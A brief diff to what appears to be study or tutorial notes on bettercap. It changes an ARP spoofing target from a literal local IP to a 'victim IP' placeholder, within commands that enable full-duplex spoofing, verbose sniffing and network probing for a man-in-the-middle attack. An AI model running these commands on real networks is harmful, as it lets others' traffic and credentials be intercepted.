@@ -64,7 +64,7 @@ sudo bettercap
 help arp.spoof
 get arp.spoof.*
 set arp.spoof.fullduplex true
-set arp.spoof.target 192.168.1.10
+set arp.spoof.target Ip_victima
 set net.sniff.verbose true
 get arp.spoof.*
 net.probe on
